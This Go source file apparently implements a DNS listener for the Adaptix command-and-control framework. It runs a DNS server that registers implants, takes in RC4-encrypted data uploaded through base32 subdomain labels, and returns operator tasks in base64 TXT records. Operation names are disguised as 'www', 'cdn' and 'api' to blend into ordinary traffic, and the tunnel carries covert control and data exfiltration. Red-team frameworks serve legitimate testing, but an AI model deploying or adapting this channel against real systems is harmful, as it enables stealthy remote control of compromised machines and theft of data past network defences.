package main

import (
	"bytes"
	"compress/zlib"
	"context"
	"crypto/rc4"
	"encoding/base32"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	mrand "math/rand/v2"
	"net"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/Adaptix-Framework/axc2/v2"
	"github.com/miekg/dns"
)

type Listener struct {
	transport *TransportDNS
}

type TransportDNS struct {
	Config TransportConfig
	Name   string

	udpServer *dns.Server
	tcpServer *dns.Server

	mu     sync.Mutex
	active bool
}

type TransportConfig struct { // DNSConfig
	HostBind     string   `json:"host_bind"`
	PortBind     int      `json:"port_bind"`
	Domain       string   `json:"domain"`
	Domains      []string `json:"-"`
	PktSize      int      `json:"pkt_size"`
	TTL          int      `json:"ttl"`
	EncryptKey   string   `json:"encrypt_key"`
	Protocol     string   `json:"protocol"`
	BurstEnabled bool     `json:"burst_enabled"`
	BurstSleep   int      `json:"burst_sleep"`
	BurstJitter  int      `json:"burst_jitter"`
}

func sidToAgentId(sid string) int64 {
	sid = strings.ToLower(strings.TrimSpace(sid))
	if len(sid) != 8 {
		return 0
	}
	uid, err := hex.DecodeString(sid)
	if err != nil || len(uid) != 4 {
		return 0
	}
	id, ok := Ts.TsAgentIdByUID(uid)
	if !ok {
		return 0
	}
	return id
}

func validConfig(config string) error {
	var conf TransportConfig
	err := json.Unmarshal([]byte(config), &conf)
	if err != nil {
		return err
	}

	if conf.HostBind == "" {
		return errors.New("host_bind is required")
	}
	if conf.PortBind < 1 || conf.PortBind > 65535 {
		return errors.New("port_bind must be 1-65535")
	}
	if conf.Domain == "" {
		return errors.New("domain is required")
	}

	keyLen := len(conf.EncryptKey)
	if keyLen != 32 {
		return errors.New("encrypt_key must be exactly 32 hex characters (16 bytes)")
	}

	return nil
}

func (t *TransportDNS) setActive(v bool) {
	t.mu.Lock()
	t.active = v
	t.mu.Unlock()
}

func (t *TransportDNS) IsActive() bool {
	t.mu.Lock()
	defer t.mu.Unlock()
	return t.active
}

func (t *TransportDNS) Start(ts adaptix.Teamserver) error {
	addr := net.JoinHostPort(t.Config.HostBind, strconv.Itoa(t.Config.PortBind))
	mux := dns.NewServeMux()
	mux.HandleFunc(".", t.handleDNS)

	t.udpServer = &dns.Server{Addr: addr, Net: "udp", Handler: mux}
	t.tcpServer = &dns.Server{Addr: addr, Net: "tcp", Handler: mux}
	t.setActive(true)

	var startErr error
	var errOnce sync.Once

	go func() {
		err := t.udpServer.ListenAndServe()
		if err != nil {
			errOnce.Do(func() { startErr = err })
			t.setActive(false)
			Ts.TsLogAdd(adaptix.LogStatusError, 0, logSrc, logCtg, "UDP listener error: %v", err)
		}
	}()

	go func() {
		err := t.tcpServer.ListenAndServe()
		if err != nil {
			errOnce.Do(func() { startErr = err })
			t.setActive(false)
			Ts.TsLogAdd(adaptix.LogStatusError, 0, logSrc, logCtg, "TCP listener error: %v", err)
		}
	}()

	time.Sleep(500 * time.Millisecond)
	return startErr
}

func (t *TransportDNS) Stop() error {
	t.setActive(false)
	ctx, cancel := context.WithTimeout(context.Background(), shutdownTimeout)
	defer cancel()

	var err error
	if t.udpServer != nil {
		if e := t.udpServer.ShutdownContext(ctx); e != nil {
			err = e
		}
	}
	if t.tcpServer != nil {
		if e := t.tcpServer.ShutdownContext(ctx); e != nil {
			err = e
		}
	}
	return err
}

/// HANDLERS

func (t *TransportDNS) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
	m := new(dns.Msg)
	m.SetReply(r)
	m.Authoritative = true

	baseTTL := uint32(t.Config.TTL)
	if baseTTL == 0 {
		baseTTL = 10
	}
	ttl := baseTTL + uint32(mrand.IntN(60))

	for _, q := range r.Question {
		req := t.parseRequest(q)

		switch req.op {
		case "HI":
			if len(req.data) > 0 {
				t.handleHI(req, w)
			}
			m.Answer = append(m.Answer, t.buildAckResponse(req, ttl))

		case "PUT":
			var ack putAckInfo
			if len(req.data) > 0 {
				ack = t.handlePUT(req)
			}
			m.Answer = append(m.Answer, t.buildPutAckResponse(req, ack, ttl))

		case "GET":
			frame := t.handleGET(req, w)
			m.Answer = append(m.Answer, t.buildDataResponse(req, frame, ttl))

		case "HB":
			needsReset, hasPendingTasks := t.handleHB(req)
			m.Answer = append(m.Answer, t.buildHBResponse(req, needsReset, hasPendingTasks, ttl))

		default:
			answ := &dns.TXT{
				Hdr: dns.RR_Header{Name: req.qname, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: ttl},
				Txt: []string{"OK"},
			}
			m.Answer = append(m.Answer, answ)
		}
	}

	_ = w.WriteMsg(m)
}

func (t *TransportDNS) parseRequest(q dns.Question) *dnsRequest {
	labels := dns.SplitDomainName(q.Name)
	base := labels

	if len(t.Config.Domains) > 0 {
		for i := range labels {
			tail := strings.ToLower(strings.Join(labels[i:], "."))
			for _, dom := range t.Config.Domains {
				if tail == dom {
					base = labels[:i]
					break
				}
			}
			if len(base) < len(labels) {
				break
			}
		}
	}

	req := new(dnsRequest)
	req.qtype = q.Qtype
	req.qname = q.Name

	if len(base) < 5 {
		return req
	}

	req.sid = strings.ToLower(base[0])
	rawOp := strings.ToLower(base[1])

	switch rawOp {
	case "www", "hi":
		req.op = "HI"
	case "cdn", "put":
		req.op = "PUT"
	case "api", "get":
		req.op = "GET"
	case "hb":
		req.op = "HB"
	}

	if v, err := strconv.ParseUint(base[2], 16, 32); err == nil {
		req.seq = int(v ^ seqXorMask)
	}

	dataLabel := strings.ToUpper(strings.Join(base[4:], ""))
	enc := base32.StdEncoding.WithPadding(base32.NoPadding)
	if db, err := enc.DecodeString(dataLabel); err == nil {
		req.data = db
	}

	if match, _ := regexp.MatchString("^[0-9a-fA-F]{8}$", req.sid); !match {
		req.op = ""
	}

	maxPayload := t.Config.PktSize * 4
	if maxPayload <= 0 {
		maxPayload = defaultChunkSize
	}
	if len(req.data) > maxPayload {
		req.data = nil
	}

	return req
}

func (t *TransportDNS) handleHI(req *dnsRequest, w dns.ResponseWriter) {
	if len(req.data) < 8 {
		return
	}

	keyBytes, err := hex.DecodeString(t.Config.EncryptKey)
	if err != nil || len(keyBytes) != 16 {
		return
	}

	cipher, err := rc4.NewCipher(keyBytes)
	if err != nil {
		return
	}

	fullBeat := make([]byte, len(req.data))
	cipher.XORKeyStream(fullBeat, req.data)

	if len(fullBeat) < 8 {
		return
	}

	beat := fullBeat
	if decompressed, ok := decompressZlibData(fullBeat); ok {
		beat = decompressed
	}

	if len(beat) < 8 {
		return
	}

	agentType := fmt.Sprintf("%08x", binary.BigEndian.Uint32(beat[:4]))
	agentUid := beat[4:8]
	agentBeat := beat[8:]

	agentId, exists := Ts.TsAgentIdByUID(agentUid)
	if !exists {
		externalIP := extractRemoteIP(w)
		ad, err := Ts.TsAgentCreate(agentType, agentUid, agentBeat, t.Name, externalIP, true)
		if err != nil {
			Ts.TsLogAdd(adaptix.LogStatusError, 0, logSrc, logCtg, "HI agent create failed: %v", err)
			return
		}
		agentId = ad.Id
	}
	_ = Ts.TsAgentSetTick(agentId, t.Name)
}

func (t *TransportDNS) handleHB(req *dnsRequest) (needsReset bool, hasPendingTasks bool) {
	agentId := sidToAgentId(req.sid)
	if agentId == 0 {
		return false, false
	}
	_ = Ts.TsAgentSetTick(agentId, t.Name)

	decrypted := rc4Crypt(req.data, t.Config.EncryptKey)

	if len(decrypted) >= 8 {
		ackOffset := binary.BigEndian.Uint32(decrypted[0:4])
		ackNonce := binary.BigEndian.Uint32(decrypted[4:8])
		Ts.TsFrameAckDelivery(agentId, ackOffset, ackNonce)
	}

	hasPendingTasks = Ts.TsFrameHasPending(agentId)
	return false, hasPendingTasks
}

func (t *TransportDNS) handleGET(req *dnsRequest, w dns.ResponseWriter) []byte {
	agentId := sidToAgentId(req.sid)
	if agentId == 0 {
		return nil
	}
	_ = Ts.TsAgentSetTick(agentId, t.Name)

	decrypted := rc4Crypt(req.data, t.Config.EncryptKey)

	var reqOffset uint32
	if len(decrypted) >= 4 {
		reqOffset = binary.BigEndian.Uint32(decrypted[0:4])
	}

	isTCP := w.RemoteAddr().Network() == "tcp"

	maxChunk := t.Config.PktSize
	if !isTCP {
		if maxChunk <= 0 || maxChunk > dnsSafeChunkSize {
			maxChunk = dnsSafeChunkSize
		}
	} else {
		if maxChunk <= 0 {
			maxChunk = defaultChunkSize
		}
	}

	stats, n, ok := Ts.TsFrameTakeStatTasks(agentId)
	if ok && !stats.Select().Empty() {
		msg := fmt.Sprintf("Sent %s", adaptix.FormatByteSize(int(n)))
		if n > 1 {
			msg = fmt.Sprintf("%s (in %d requests)", msg, n)
		}
		Ts.TsAgentConsoleOutput(agentId, "", adaptix.MESSAGE_INFO, msg, "", false)
	}

	total, offset, data, taskNonce, isEmpty := Ts.TsFrameGetChunkSticky(agentId, reqOffset, maxChunk, nil)
	if isEmpty || len(data) == 0 {
		return nil
	}

	frame := make([]byte, 12+len(data))
	binary.BigEndian.PutUint32(frame[0:4], total)
	binary.BigEndian.PutUint32(frame[4:8], offset)
	binary.BigEndian.PutUint32(frame[8:12], taskNonce)
	copy(frame[12:], data)
	return frame
}

func (t *TransportDNS) handlePUT(req *dnsRequest) putAckInfo {
	ack := putAckInfo{}

	agentId := sidToAgentId(req.sid)
	if agentId == 0 || len(req.data) == 0 {
		return ack
	}

	decrypted := rc4Crypt(req.data, t.Config.EncryptKey)

	if len(decrypted) < 8 {
		return ack
	}

	total := binary.BigEndian.Uint32(decrypted[0:4])
	offset := binary.BigEndian.Uint32(decrypted[4:8])
	chunk := decrypted[8:]

	if total == 0 {
		return ack
	}

	complete, nextExpectedOff, filled, _, assembled := Ts.TsFramePut(agentId, offset, chunk, total, 0)

	if complete && assembled != nil {
		_ = Ts.TsAgentProcessData(agentId, assembled)
	}

	ack.total = total
	ack.complete = complete
	ack.nextExpectedOff = nextExpectedOff
	ack.filled = filled

	_ = Ts.TsAgentSetTick(agentId, t.Name)
	return ack
}

func (t *TransportDNS) buildAckResponse(req *dnsRequest, ttl uint32) dns.RR {
	switch req.qtype {
	case dns.TypeA:
		return &dns.A{
			Hdr: dns.RR_Header{Name: req.qname, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: ttl},
			A:   net.ParseIP("127.0.0.1").To4(),
		}
	case dns.TypeAAAA:
		return &dns.AAAA{
			Hdr:  dns.RR_Header{Name: req.qname, Rrtype: dns.TypeAAAA, Class: dns.ClassINET, Ttl: ttl},
			AAAA: net.ParseIP("::1").To16(),
		}
	default:
		return &dns.TXT{
			Hdr: dns.RR_Header{Name: req.qname, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: ttl},
			Txt: []string{"OK"},
		}
	}
}

func (t *TransportDNS) buildPutAckResponse(req *dnsRequest, ack putAckInfo, ttl uint32) dns.RR {
	switch req.qtype {
	case dns.TypeA:
		ip := make(net.IP, 4)
		var flags byte
		if ack.complete {
			flags |= 0x01
		}
		ip[0] = flags
		ip[1] = byte((ack.nextExpectedOff >> 16) & 0xFF)
		ip[2] = byte((ack.nextExpectedOff >> 8) & 0xFF)
		ip[3] = byte(ack.nextExpectedOff & 0xFF)
		return &dns.A{
			Hdr: dns.RR_Header{Name: req.qname, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: ttl},
			A:   ip,
		}
	case dns.TypeAAAA:
		ip := make(net.IP, 16)
		var flags byte
		if ack.complete {
			flags |= 0x01
		}
		ip[0] = flags
		ip[1] = byte((ack.nextExpectedOff >> 24) & 0xFF)
		ip[2] = byte((ack.nextExpectedOff >> 16) & 0xFF)
		ip[3] = byte((ack.nextExpectedOff >> 8) & 0xFF)
		ip[4] = byte(ack.nextExpectedOff & 0xFF)
		ip[5] = byte((ack.filled >> 24) & 0xFF)
		ip[6] = byte((ack.filled >> 16) & 0xFF)
		ip[7] = byte((ack.filled >> 8) & 0xFF)
		ip[8] = byte(ack.filled & 0xFF)
		return &dns.AAAA{
			Hdr:  dns.RR_Header{Name: req.qname, Rrtype: dns.TypeAAAA, Class: dns.ClassINET, Ttl: ttl},
			AAAA: ip,
		}
	default:
		return &dns.TXT{
			Hdr: dns.RR_Header{Name: req.qname, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: ttl},
			Txt: []string{"OK"},
		}
	}
}

func (t *TransportDNS) buildHBResponse(req *dnsRequest, needsReset bool, hasPendingTasks bool, ttl uint32) dns.RR {
	switch req.qtype {
	case dns.TypeA:
		ip := make(net.IP, 4)
		var flags byte
		if hasPendingTasks {
			flags |= 0x01
		}
		if needsReset {
			flags |= 0x02
		}
		ip[0] = flags
		ip[1] = 0
		ip[2] = 0
		ip[3] = 0
		return &dns.A{
			Hdr: dns.RR_Header{Name: req.qname, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: ttl},
			A:   ip,
		}
	case dns.TypeAAAA:
		ip := make(net.IP, 16)
		var flags byte
		if hasPendingTasks {
			flags |= 0x01
		}
		if needsReset {
			flags |= 0x02
		}
		ip[0] = flags
		return &dns.AAAA{
			Hdr:  dns.RR_Header{Name: req.qname, Rrtype: dns.TypeAAAA, Class: dns.ClassINET, Ttl: ttl},
			AAAA: ip,
		}
	default:
		return &dns.TXT{
			Hdr: dns.RR_Header{Name: req.qname, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: ttl},
			Txt: []string{"OK"},
		}
	}
}

func (t *TransportDNS) buildDataResponse(req *dnsRequest, frame []byte, ttl uint32) dns.RR {
	if len(frame) == 0 {
		return &dns.TXT{
			Hdr: dns.RR_Header{Name: req.qname, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: ttl},
			Txt: []string{""},
		}
	}

	encrypted := rc4Crypt(frame, t.Config.EncryptKey)
	b64Str := base64.StdEncoding.EncodeToString(encrypted)

	var chunks []string
	for len(b64Str) > 255 {
		chunks = append(chunks, b64Str[:255])
		b64Str = b64Str[255:]
	}
	chunks = append(chunks, b64Str)

	return &dns.TXT{
		Hdr: dns.RR_Header{Name: req.qname, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: ttl},
		Txt: chunks,
	}
}

/// UTILS

const (
	seqXorMask       = 0x39913991
	dnsSafeChunkSize = 280
	defaultChunkSize = 4096
	shutdownTimeout  = 2 * time.Second
)

type dnsRequest struct {
	sid   string
	op    string
	seq   int
	data  []byte
	qtype uint16
	qname string
}

type putAckInfo struct {
	nextExpectedOff uint32
	total           uint32
	filled          uint32
	complete        bool
}

func rc4Crypt(data []byte, keyHex string) []byte {
	if len(data) == 0 {
		return data
	}
	keyBytes, err := hex.DecodeString(keyHex)
	if err != nil || len(keyBytes) != 16 {
		return data
	}
	cipher, err := rc4.NewCipher(keyBytes)
	if err != nil {
		return data
	}
	result := make([]byte, len(data))
	cipher.XORKeyStream(result, data)
	return result
}

func decompressZlibData(data []byte) ([]byte, bool) {
	if len(data) < 2 {
		return data, false
	}
	zr, err := zlib.NewReader(bytes.NewReader(data))
	if err != nil {
		return data, false
	}
	decompressed, errRead := io.ReadAll(zr)
	zr.Close()
	if errRead == nil && len(decompressed) > 0 {
		return decompressed, true
	}
	return data, false
}

func extractRemoteIP(w dns.ResponseWriter) string {
	addr := w.RemoteAddr().String()
	if host, _, err := net.SplitHostPort(addr); err == nil {
		return host
	}
	return addr
}
